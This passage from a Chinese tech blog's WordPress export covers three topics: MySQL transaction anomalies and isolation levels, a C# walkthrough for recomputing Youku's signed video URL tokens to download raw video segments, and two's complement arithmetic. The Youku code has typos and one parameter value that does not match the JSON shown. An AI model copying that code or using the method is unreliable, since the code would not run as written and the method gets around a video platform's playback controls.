<h2>脏读（dirty read）</h2>
A事务读取B事务尚未提交的更改数据，并在这个数据的基础上操作。如果恰巧B事务回滚，那么A事务读到的数据根本是不被承认的。来看取款事务和转账事务并发时引发的脏读场景：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_B8Se.jpg"><img class="aligncenter size-full wp-image-320" alt="15150645_B8Se" src="http://storage.veitor.net/uploads/2014/09/15150645_B8Se.jpg" width="965" height="324" /></a>
&nbsp;
在这个场景中，B希望取款500元而后又撤销了动作，而A往相同的账户中转账100元，就因为A事务读取了B事务尚未提交的数据，因而造成账户白白丢失了500元。在Oracle数据库中，不会发生脏读的情况。
<h2>不可重复读（unrepeatable read）</h2>
不可重复读是指<span style="color: #ff6600;"> A事务读取了B事务已经提交的更改数据</span>。假设A在取款事务的过程中，B往该账户转账100元，A两次读取账户的余额发生不一致：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_B8Se1.jpg"><img class="aligncenter size-full wp-image-321" alt="15150645_B8Se" src="http://storage.veitor.net/uploads/2014/09/15150645_B8Se1.jpg" width="970" height="329" /></a>
&nbsp;
在同一事务中，T4时间点和T7时间点读取账户存款余额不一样。
<h2>幻象读（phantom read）</h2>
A事务读取B事务提交的新增数据，这时A事务将出现幻象读的问题。幻象读一般发生在计算统计数据的事务中，举一个例子，假设银行系统在同一个事务中，两次统计存款账户的总金额，在两次统计过程中，刚好新增了一个存款账户，并存入100元，这时，两次统计的总金额将不一致：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_d6yw.jpg"><img class="aligncenter size-full wp-image-322" alt="15150645_d6yw" src="http://storage.veitor.net/uploads/2014/09/15150645_d6yw.jpg" width="959" height="245" /></a>
&nbsp;
如果新增数据刚好满足事务的查询条件，这个新数据就进入了事务的视野，因而产生了两个统计不一致的情况。
幻象读和不可重复读是两个容易混淆的概念，前者是指读到了其他已经提交事务的新增数据，而后者是指读到了已经提交事务的更改数据（更改或删除），为了避免这两种情况，采取的对策是不同的，防止读取到更改数据，只需要对操作的数据添加行级锁，阻止操作中的数据发生变化，而防止读取到新增数据，则往往需要添加表级锁——将整个表锁定，防止新增数据（Oracle使用多版本数据的方式实现）。
<h2>第一类丢失更新</h2>
A事务撤销时，<span style="color: #ff6600;">把已经提交的B事务的更新数据覆盖了</span>。这种错误可能造成很严重的问题，通过下面的账户取款转账就可以看出来：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_d6yw1.jpg"><img class="aligncenter size-full wp-image-323" alt="15150645_d6yw" src="http://storage.veitor.net/uploads/2014/09/15150645_d6yw1.jpg" width="963" height="339" /></a>
A事务在撤销时，“不小心”将B事务已经转入账户的金额给抹去了。
<h2>第二类丢失更新</h2>
<span style="color: #ff6600;">A事务覆盖B事务已经提交的数据</span>，造成B事务所做操作丢失：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_d6yw2.jpg"><img class="aligncenter size-full wp-image-324" alt="15150645_d6yw" src="http://storage.veitor.net/uploads/2014/09/15150645_d6yw2.jpg" width="957" height="353" /></a>
&nbsp;
上面的例子里由于支票转账事务覆盖了取款事务对存款余额所做的更新，导致银行最后损失了100元，相反如果转账事务先提交，那么用户账户将损失100元。
<h1>四种隔离级别</h1>
尽管数据库为用户提供了锁的DML操作方式，但直接使用锁管理是非常麻烦的，因此数据库为用户提供了自动锁机制。只要用户指定会话的事务隔离级别，数据库就会分析事务中的SQL语句，然后自动为事务操作的数据资源添加上适合的锁。此外数据库还会维护这些锁，当一个资源上的锁数目太多时，自动进行锁升级以提高系统的运行性能，而这一过程对用户来说完全是透明的。
ANSI/ISO SQL 92标准定义了4个等级的事务隔离级别：
<a href="http://storage.veitor.net/uploads/2014/09/15150645_d6yw3.jpg"><img class="aligncenter size-full wp-image-325" alt="15150645_d6yw" src="http://storage.veitor.net/uploads/2014/09/15150645_d6yw3.jpg" width="973" height="228" /></a>
&nbsp;
事务的隔离级别和数据库并发性是对立的，两者此增彼长。一般来说，使用READ UNCOMMITED隔离级别的数据库拥有最高的并发性和吞吐量，而使用SERIALIZABLE隔离级别的数据库并发性最低。
Mysql的默认隔离级别时Repeatable Read，即可重复读。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>319</wp:post_id>
		<wp:post_date><![CDATA[2014-09-22 14:20:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-09-22 14:20:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mysql%e4%ba%8b%e5%8a%a1%e4%bb%a5%e5%8f%8a%e9%9a%94%e7%a6%bb%e7%ba%a7%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="%e4%ba%8b%e5%8a%a1"><![CDATA[事务]]></category>
						</item>
					<item>
		<title>优酷真实视频地址解析</title>
		<link>http://wp.veitor.net/2014/10/08/%e4%bc%98%e9%85%b7%e7%9c%9f%e5%ae%9e%e8%a7%86%e9%a2%91%e5%9c%b0%e5%9d%80%e8%a7%a3%e6%9e%90/</link>
		<pubDate>Wed, 08 Oct 2014 08:41:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=330</guid>
		<description></description>
		<content:encoded><![CDATA[序：优酷之前更新了次算法(很久之前了，呵呵。。。)，故此很多博客的解析算法已经无法使用。很多大牛也已经更新了新的解析方法。我也在此写篇解析过程的文章。(本文使用语言为C#)
由于优酷视频地址时间限制，在你访问本篇文章时，下面所属链接有可能已经失效，望见谅。
例：<a href="http://v.youku.com/v_show/id_XNzk2NTI0MzMy.html">http://v.youku.com/v_show/id_<strong>XNzk2NTI0MzMy</strong>.html</a>
<h1>1:获取视频vid</h1>
在视频url中标红部分。一个<a href="http://www.cnblogs.com/zhaojunjie/p/3344909.html" target="_blank" rel="noopener noreferrer">正则表达式</a>即可获取。
<pre class="lang:php decode:true">string getVid(string url)
{
    string strRegex = "(?&lt;=id_)(\\w+)";
    Regex reg = new Regex(strRegex);
    Match match = reg.Match(url);
    return match.ToString();
}</pre>
&nbsp;
<h1>2:获取视频元信息</h1>
<a href="http://v.youku.com/player/getPlayList/VideoIDS/XNzk2NTI0MzMy/Pf/4/ctype/12/ev/1" target="_blank" rel="noopener noreferrer">http://v.youku.com/player/getPlayList/VideoIDS/</a><a href="http://v.youku.com/player/getPlayList/VideoIDS/XNzk2NTI0MzMy/Pf/4/ctype/12/ev/1" target="_blank" rel="noopener noreferrer"><strong>XNzk2NTI0MzMy</strong>/Pf/4/ctype/12/ev/1</a>
将前述vid嵌入到上面url中访问即可得到视频信息文件。由于视频信息过长不在此贴出全部内容。下面是部分重要内容的展示。(获取文件为json文件，可直接解析)
<pre class="lang:php decode:true">{ "data": [ {
            "ip": 996949050,
            "ep": "NQXRTAodIbrd1vnC8+JxB4emuRs41w7DWho=",
            "segs": {
                "hd2": [
                    {
                        "no": "0",
                        "size": "34602810",
                        "seconds": 205,
                        "k": "248fe14b4c1b37302411f67a",
                        "k2": "1c8e113cecad924c5"
                    },
                    {
                        "no": "1",
                    },] }, } ],}</pre>
上面显示的内容后面都会使用到。其中<strong>segs包含hd3,hd2,flv,mp4,3gp</strong>等各种格式，并且每种格式下均分为若干段。本次选用清晰度较高的hd2(视频格式为flv)
<h1><strong>3:拼接m3u8地址</strong></h1>
<a href="http://pl.youku.com/playlist/m3u8?ctype=12&amp;ep=%7b0%7d&amp;ev=1&amp;keyframe=1&amp;oip=%7b1%7d&amp;sid=%7b2%7d&amp;token=%7b3%7d&amp;type=%7b4%7d&amp;vid=%7b5%7d">http://pl.youku.com/playlist/m3u8?ctype=12&amp;ep={0}&amp;ev=1&amp;keyframe=1&amp;oip={1}&amp;sid={2}&amp;token={3}&amp;type={4}&amp;vid={5}</a>
以上共有6个参数，其中vid和oip已经得到，分别之前的vid和json文件中的ip字段，即(<strong>XNzk2NTI0MzMy</strong>和<strong>1991941296</strong>)，但是ep,sid,token需要重新计算(json文件中的ep值不能直接使用)。type即为之前选择的segs。
<h2>3.1计算ep,sid,token</h2>
计算方法单纯的为数学计算，下面给出计算的函数。三个参数可一次性计算得到。其中涉及到Base64编码解码知识，<a href="http://www.cnblogs.com/zhaojunjie/p/3946427.html" target="_blank" rel="noopener noreferrer">点击查看</a>。
<pre class="lang:php decode:true">private static string myEncoder(string a, byte[] c, bool isToBase64)
        {
            string result = "";
            List&lt;Byte&gt; bytesR = new List&lt;byte&gt;();
            int f = 0, h = 0, q = 0;
            int[] b = new int[256];
            for (int i = 0; i &lt; 256; i++)
                    b[i] = i;
            while (h &lt; 256)
            {
                f = (f + b[h] + a[h % a.Length]) % 256;
                int temp = b[h];
                b[h] = b[f];
                b[f] = temp;
                h++;
            }
            f = 0; h = 0; q = 0;
            while (q &lt; c.Length)
            {
                h = (h + 1) % 256;
                f = (f + b[h]) % 256;
                int temp = b[h];
                b[h] = b[f];
                b[f] = temp;
                byte[] bytes = new byte[] { (byte)(c[q] ^ b[(b[h] + b[f]) % 256]) };
                bytesR.Add(bytes[0]);
                result += System.Text.ASCIIEncoding.ASCII.GetString(bytes);
                q++;
            }
            if (isToBase64)
            {
                Byte[] byteR = bytesR.ToArray();
                result = Convert.ToBase64String(byteR);
            }
            return result;
        }
        public static void getEp(string vid, string ep, ref string pNew, ref string token, ref string sid)
        {
            string template1 = "becaf9be";
            string template2 = "bf7e5f01";
            byte[] bytes = Convert.FromBase64String(ep);
            ep = ystem.Text.ASCIIEncoding.ASCII.GetString(bytes);
            string temp = myEncoder(template1, bytes, false);
            string[] part = temp.Split('_');
            sid = part[0];
            token = part[1];
            string whole = string.Format("{0}_{1}_{2}", sid, vid, token);
            byte[] newbytes = System.Text.ASCIIEncoding.ASCII.GetBytes(whole);
            epNew = myEncoder(template2, newbytes, true);
        }</pre>
&nbsp;
<p align="left">计算得到ep,token,sid分别为cCaVGE6OUc8H4ircjj8bMiuwdH8KXJZ0vESH/7YbAMZuNaHQmjbTwg==, 3825, 241273717793612e7b085。注意，此时ep并不能直接拼接到url中，需要对此做一下url编码ToUrlEncode(ep)。最终ep为cCaVGE6OUc8H4ircjj8bMiuwdH8KXJZ0vESH%2f7YbAMZuNaHQmjbTwg%3d%3d</p>
<h2 align="left">3.2视频格式及清晰度</h2>
<p align="left">视频格式和选择的segs有密切关系。如本文选择的hd2，格式即为flv，下面是segs,视频格式和清晰度的对照。之前对此部分理解有些偏差，多谢<a href="http://home.cnblogs.com/u/xzpgzl/">削着苹果走路</a>提醒。<a href="http://www.cnblogs.com/xzpgzl/" target="_blank" rel="noopener noreferrer">
</a></p>
<pre class="lang:php decode:true">“segs”,”视频格式”,”清晰度”
"hd3", "flv", "1080P"
"hd2", "flv", "超清"
"mp4", "mp4", "高清"
"flvhd", "flv", "高清"
"flv", "flv", "标清"
"3gphd", "3gp", "高清"</pre>
&nbsp;
<h2 align="left">3.3拼接地址</h2>
<p align="left">　　最后的m3u8地址为</p>
<p align="left"><a href="http://pl.youku.com/playlist/m3u8?ctype=12&amp;ep=cCaVGE6OUc8H4ircjj8bMiuwdH8KXJZ0vESH%2f7YbAMZuNaHQmjbTwg%3d%3d&amp;ev=1&amp;keyframe=1&amp;oip=996949050&amp;sid=241273717793612e7b085&amp;token=3825&amp;type=hd2&amp;vid=XNzk2NTI0MzMy" target="_blank" rel="noopener noreferrer">http://pl.youku.com/playlist/m3u8?ctype=12&amp;ep=cCaVGE6OUc8H4ircjj8bMiuwdH8KXJZ0vESH%2f7YbAMZuNaHQmjbTwg%3d%3d&amp;ev=1&amp;keyframe=1&amp;oip=996949050&amp;sid=241273717793612e7b085&amp;token=3825&amp;type=hd2&amp;vid=XNzk2NTI0MzMy</a></p>
<h1>4:获取视频地址</h1>
将上述m3u8文件下载后，其中内容即为真实地址，不过还需要稍微处理一下。部分内容如下：
<pre class="lang:php decode:true">#EXTM3U
#EXT-X-TARGETDURATION:12
#EXT-X-VERSION:3
#EXTINF:6.006,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=0&amp;ts_end=5.906&amp;ts_seg_no=0&amp;ts_keyframe=1
#EXTINF:5.464,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=5.906&amp;ts_end=11.37&amp;ts_seg_no=1&amp;ts_keyframe=1
#EXTINF:5.505,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=11.37&amp;ts_end=16.875&amp;ts_seg_no=2&amp;ts_keyframe=1
#EXTINF:9.26,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=16.875&amp;ts_end=26.135&amp;ts_seg_no=3&amp;ts_keyframe=1
#EXTINF:11.136,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=26.135&amp;ts_end=37.271&amp;ts_seg_no=4&amp;ts_keyframe=1
#EXTINF:8.258,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=37.271&amp;ts_end=45.529&amp;ts_seg_no=5&amp;ts_keyframe=1
#EXTINF:9.843,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=45.529&amp;ts_end=55.372&amp;ts_seg_no=6&amp;ts_keyframe=1
#EXTINF:10.26,
http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv?ts_start=55.372&amp;ts_end=65.632&amp;ts_seg_no=7&amp;ts_keyframe=1</pre>
其中每条url只包含6s左右视频，但是可将url中参数部分去掉即可得到实际的长度。但是每条去掉后需合并一下相同的url，如上述列表可得到url片段
<a href="http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv" target="_blank" rel="noopener noreferrer">http://59.108.137.14/65666E0ED34581E6B96293A18/0300010F005430BCBA49631468DEFEC61C5678-3A78-37BA-1971-21A0D4EEA0E7.flv</a>
将m3u8中所有的url片段全部下载即可大功告成。
<a href="http://storage.veitor.net/uploads/2014/10/QQ截图20141008164115.jpg"><img class="aligncenter size-full wp-image-331" alt="QQ截图20141008164115" src="http://storage.veitor.net/uploads/2014/10/QQ截图20141008164115.jpg" width="634" height="361" /></a>
原文地址：<a href="http://www.cnblogs.com/zhaojunjie/p/4009192.html" target="_blank" rel="noopener noreferrer">http://www.cnblogs.com/zhaojunjie/p/4009192.html</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>330</wp:post_id>
		<wp:post_date><![CDATA[2014-10-08 08:41:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-10-08 08:41:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bc%98%e9%85%b7%e7%9c%9f%e5%ae%9e%e8%a7%86%e9%a2%91%e5%9c%b0%e5%9d%80%e8%a7%a3%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="post_tag" nicename="%e4%bc%98%e9%85%b7"><![CDATA[优酷]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_317f8c79c30cd3ffa427c58ca6490aed]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ffcd9b13f3456cbd6bffaba7978af0d1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7c53d66af385446e6b80191ea814c24f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_fe23f1e81f99218929cc654498b45e19]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_d4ec4fb708d499361bf97c4a3f31a119]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_5ec385bcdddfc94e53de17b4ff3d3662]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4bef0d90fcb74b862f510670bdd59e3a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>原码，反码，补码详解</title>
		<link>http://wp.veitor.net/2014/10/23/%e5%8e%9f%e7%a0%81-%e5%8f%8d%e7%a0%81-%e8%a1%a5%e7%a0%81%e8%af%a6%e8%a7%a3/</link>
		<pubDate>Thu, 23 Oct 2014 14:30:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=340</guid>
		<description></description>
		<content:encoded><![CDATA[本篇文章讲解了计算机的原码, 反码和补码. 并且进行了深入探求了为何要使用反码和补码, 以及更进一步的论证了为何可以用反码, 补码的加法计算原码的减法.  希望本文对大家学习计算机基础有所帮助!
<h2>一. 机器数和真值</h2>
在学习原码, 反码和补码之前, 需要先了解机器数和真值的概念.
<h3>1、机器数</h3>
一个数在计算机中的二进制表示形式,  叫做这个数的机器数。机器数是带符号的，在计算机用一个数的最高位存放符号, 正数为0, 负数为1.
比如，十进制中的数 +3 ，计算机字长为8位，转换成二进制就是00000011。如果是 -3 ，就是 10000011 。
那么，这里的 00000011 和 10000011 就是机器数。
<h3>2、真值</h3>
<blockquote>因为第一位是符号位，所以机器数的形式值就不等于真正的数值。例如上面的有符号数 10000011，其最高位1代表负，其真正数值是 -3 而不是形式值131（10000011转换成十进制等于131）。所以，为区别起见，将带符号位的机器数对应的真正数值称为机器数的真值。</blockquote>
例：0000 0001的真值 = +000 0001 = +1，1000 0001的真值 = –000 0001 = –1
&nbsp;
<h2>二. 原码, 反码, 补码的基础概念和计算方法.</h2>
在探求为何机器要使用补码之前, 让我们先了解原码, 反码和补码的概念.对于一个数, 计算机要使用一定的编码方式进行存储. 原码, 反码, 补码是机器存储一个具体数字的编码方式.
<h3>1. 原码</h3>
原码就是符号位加上真值的绝对值, 即用第一位表示符号, 其余位表示值. 比如如果是8位二进制:
<blockquote>[+1]<sub>原</sub> = 0000 0001
[-1]<sub>原</sub> = 1000 0001</blockquote>
第一位是符号位. 因为第一位是符号位, 所以8位二进制数的取值范围就是:
<blockquote>[1111 1111 , 0111 1111]</blockquote>
即
<blockquote>[-127 , 127]</blockquote>
原码是人脑最容易理解和计算的表示方式.
<h3>2. 反码</h3>
反码的表示方法是:
正数的反码是其本身
负数的反码是在其原码的基础上, 符号位不变，其余各个位取反.
<blockquote>[+1] = [00000001]<sub>原</sub> = [00000001]<sub>反</sub>
[-1] = [10000001]<sub>原</sub> = [11111110]<sub>反</sub></blockquote>
可见如果一个反码表示的是负数, 人脑无法直观的看出来它的数值. 通常要将其转换成原码再计算.
<h3>3. 补码</h3>
补码的表示方法是:
正数的补码就是其本身
负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后+1. (即在反码的基础上+1)
<blockquote>[+1] = [00000001]<sub>原</sub> = [00000001]<sub>反</sub> = [00000001]<sub>补</sub>
[-1] = [10000001]<sub>原</sub> = [11111110]<sub>反</sub> = [11111111]<sub>补</sub></blockquote>
对于负数, 补码表示方式也是人脑无法直观看出其数值的. 通常也需要转换成原码在计算其数值.
&nbsp;
<h2>三. 为何要使用原码, 反码和补码</h2>
在开始深入学习前, 我的学习建议是先"死记硬背"上面的原码, 反码和补码的表示方式以及计算方法.
现在我们知道了计算机可以有三种编码方式表示一个数. 对于正数因为三种编码方式的结果都相同:
<blockquote>[+1] = [00000001]<sub>原</sub> = [00000001]<sub>反</sub> = [00000001]<sub>补</sub></blockquote>
所以不需要过多解释. 但是对于负数:
<blockquote>[-1] = [10000001]<sub>原</sub> = [11111110]<sub>反</sub> = [11111111]<sub>补</sub></blockquote>
可见原码, 反码和补码是完全不同的. 既然原码才是被人脑直接识别并用于计算表示方式, 为何还会有反码和补码呢?
首先, 因为人脑可以知道第一位是符号位, 在计算的时候我们会根据符号位, 选择对真值区域的加减. (真值的概念在本文最开头). 但是对于计算机, 加减乘数已经是最基础的运算, 要设计的尽量简单. 计算机辨别"符号位"显然会让计算机的基础电路设计变得十分复杂! 于是人们想出了将符号位也参与运算的方法. 我们知道, 根据运算法则减去一个正数等于加上一个负数, 即: 1-1 = 1 + (-1) = 0 , 所以机器可以只有加法而没有减法, 这样计算机运算的设计就更简单了.
于是人们开始探索 将符号位参与运算, 并且只保留加法的方法. 首先来看原码:
计算十进制的表达式: 1-1=0
<blockquote>1 - 1 = 1 + (-1) = [00000001]<sub>原</sub> + [10000001]<sub>原</sub> = [10000010]<sub>原</sub> = -2</blockquote>
如果用原码表示, 让符号位也参与计算, 显然对于减法来说, 结果是不正确的.这也就是为何计算机内部不使用原码表示一个数.
为了解决原码做减法的问题, 出现了反码:
计算十进制的表达式: 1-1=0
<blockquote>1 - 1 = 1 + (-1) = [0000 0001]<sub>原</sub> + [1000 0001]<sub>原</sub>= [0000 0001]<sub>反</sub> + [1111 1110]<sub>反</sub> = [1111 1111]<sub>反</sub> = [1000 0000]<sub>原</sub> = -0</blockquote>
发现用反码计算减法, 结果的真值部分是正确的. 而唯一的问题其实就出现在"0"这个特殊的数值上. 虽然人们理解上+0和-0是一样的, 但是0带符号是没有任何意义的. 而且会有[0000 0000]<sub>原</sub>和[1000 0000]<sub>原</sub>两个编码表示0.
于是补码的出现, 解决了0的符号以及两个编码的问题:
<blockquote>1-1 = 1 + (-1) = [0000 0001]<sub>原</sub> + [1000 0001]<sub>原</sub> = [0000 0001]<sub>补</sub> + [1111 1111]<sub>补</sub> = [0000 0000]<sub>补</sub>=[0000 0000]<sub>原</sub></blockquote>
这样0用[0000 0000]表示, 而以前出现问题的-0则不存在了.而且可以用[1000 0000]表示-128:
<blockquote>(-1) + (-127) = [1000 0001]<sub>原</sub> + [1111 1111]<sub>原</sub> = [1111 1111]<sub>补</sub> + [1000 0001]<sub>补</sub> = [1000 0000]<sub>补</sub></blockquote>
-1-127的结果应该是-128, 在用补码运算的结果中, [1000 0000]<sub>补</sub> 就是-128. 但是注意因为实际上是使用以前的-0的补码来表示-128, 所以-128并没有原码和反码表示.(对-128的补码表示[1000 0000]补算出来的原码是[0000 0000]<sub>原</sub>, 这是不正确的)
使用补码, 不仅仅修复了0的符号以及存在两个编码的问题, 而且还能够多表示一个最低数. 这就是为什么8位二进制, 使用原码或反码表示的范围为[-127, +127], 而使用补码表示的范围为[-128, 127].
因为机器使用补码, 所以对于编程中常用到的32位int类型, 可以表示范围是: [-2<sup>31</sup>, 2<sup>31</sup>-1] 因为第一位表示的是符号位.而使用补码表示时又可以多保存一个最小值.
&nbsp;
<h2>四 原码, 反码, 补码 再深入</h2>
计算机巧妙地把符号位参与运算, 并且将减法变成了加法, 背后蕴含了怎样的数学原理呢?
将钟表想象成是一个1位的12进制数. 如果当前时间是6点, 我希望将时间设置成4点, 需要怎么做呢?我们可以:
<blockquote>1. 往回拨2个小时: 6 - 2 = 4
2. 往前拨10个小时: (6 + 10) mod 12 = 4
3. 往前拨10+12=22个小时: (6+22) mod 12 =4</blockquote>
2,3方法中的mod是指取模操作, 16 mod 12 =4 即用16除以12后的余数是4.
所以钟表往回拨(减法)的结果可以用往前拨(加法)替代!
现在的焦点就落在了如何用一个正数, 来替代一个负数. 上面的例子我们能感觉出来一些端倪, 发现一些规律. 但是数学是严谨的. 不能靠感觉.
首先介绍一个数学中相关的概念: 同余
&nbsp;
<h3>同余的概念</h3>
两个整数a，b，若它们除以整数m所得的余数相等，则称a，b对于模m同余
记作 a ≡ b (mod m)
读作 a 与 b 关于模 m 同余。
举例说明:
<blockquote>4 mod 12 = 4
16 mod 12 = 4
28 mod 12 = 4</blockquote>
所以4, 16, 28关于模 12 同余.
&nbsp;
<h3>负数取模</h3>
正数进行mod运算是很简单的. 但是负数呢?
下面是关于mod运算的数学定义:
<img class="size-full wp-image-341 alignnone" alt="201103302155504514" src="http://storage.veitor.net/uploads/2014/10/201103302155504514.jpg" width="244" height="34" />
上面是截图, "取下界"符号找不到如何输入(word中粘贴过来后乱码). 下面是使用"L"和"J"替换上图的"取下界"符号:
<blockquote>x mod y = x - y L x / y J</blockquote>
上面公式的意思是:
x mod y等于 x 减去 y 乘上 x与y的商的下界.
以 -3 mod 2 举例:
<blockquote>-3 mod 2
= -3 - 2xL -3/2 J
= -3 - 2xL-1.5J
= -3 - 2x(-2)
= -3 + 4 = 1</blockquote>
所以:
<blockquote>(-2) mod 12 = 12-2=10
(-4) mod 12 = 12-4 = 8
(-5) mod 12 = 12 - 5 = 7</blockquote>
&nbsp;
<h3>开始证明</h3>
再回到时钟的问题上:
<blockquote>回拨2小时 = 前拨10小时
回拨4小时 = 前拨8小时
回拨5小时= 前拨7小时</blockquote>
注意, 这里发现的规律!
结合上面学到的同余的概念.实际上:
<blockquote>(-2) mod 12 = 10
10 mod 12 = 10</blockquote>
-2与10是同余的.
<blockquote>(-4) mod 12 = 8
8 mod 12 = 8</blockquote>
-4与8是同余的.
距离成功越来越近了. 要实现用正数替代负数, 只需要运用同余数的两个定理:
反身性:
<blockquote>a ≡ a (mod m)</blockquote>
这个定理是很显而易见的.
线性运算定理:
<blockquote>如果a ≡ b (mod m)，c ≡ d (mod m) 那么:
(1)a ± c ≡ b ± d (mod m)
(2)a * c ≡ b * d (mod m)</blockquote>
如果想看这个定理的证明, 请看:<a href="http://baike.baidu.com/view/79282.htm">http://baike.baidu.com/view/79282.htm</a>
所以:
<blockquote>7 ≡ 7 (mod 12)
(-2) ≡ 10 (mod 12)
7 -2 ≡ 7 + 10 (mod 12)</blockquote>
现在我们为一个负数, 找到了它的正数同余数. 但是并不是7-2 = 7+10, 而是 7 -2 ≡ 7 + 10 (mod 12) , 即计算结果的余数相等.
接下来回到二进制的问题上, 看一下: 2-1=1的问题.
<blockquote>2-1=2+(-1) = [0000 0010]<sub>原</sub> + [1000 0001]<sub>原</sub>= [0000 0010]<sub>反</sub> + [1111 1110]<sub>反</sub></blockquote>
先到这一步, -1的反码表示是1111 1110. 如果这里将[1111 1110]认为是原码, 则[1111 1110]原 = -126, 这里将符号位除去, 即认为是126.
发现有如下规律:
<blockquote>(-1) mod 127 = 126
126 mod 127 = 126</blockquote>
即:
<blockquote>(-1) ≡ 126 (mod 127)
2-1 ≡ 2+126 (mod 127)</blockquote>
2-1 与 2+126的余数结果是相同的! 而这个余数, 正式我们的期望的计算结果: 2-1=1
所以说一个数的反码, 实际上是这个数对于一个膜的同余数. 而这个膜并不是我们的二进制, 而是所能表示的最大值! 这就和钟表一样, 转了一圈后总能找到在可表示范围内的一个正确的数值!
而2+126很显然相当于钟表转过了一轮, 而因为符号位是参与计算的, 正好和溢出的最高位形成正确的运算结果.
既然反码可以将减法变成加法, 那么现在计算机使用的补码呢? 为什么在反码的基础上加1, 还能得到正确的结果?
<blockquote>2-1=2+(-1) = [0000 0010]<sub>原</sub> + [1000 0001]<sub>原</sub> = [0000 0010]<sub>补</sub> + [1111 1111]<sub>补</sub></blockquote>
如果把[1111 1111]当成原码, 去除符号位, 则:
<blockquote>[0111 1111]<sub>原</sub> = 127</blockquote>
其实, 在反码的基础上+1, 只是相当于增加了膜的值:
<blockquote>(-1) mod 128 = 127
127 mod 128 = 127
2-1 ≡ 2+127 (mod 128)</blockquote>
此时, 表盘相当于每128个刻度转一轮. 所以用补码表示的运算结果最小值和最大值应该是[-128, 128].
但是由于0的特殊情况, 没有办法表示128, 所以补码的取值范围是[-128, 127]
本人一直不善于数学, 所以如果文中有不对的地方请大家多多包含, 多多指点!]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>340</wp:post_id>
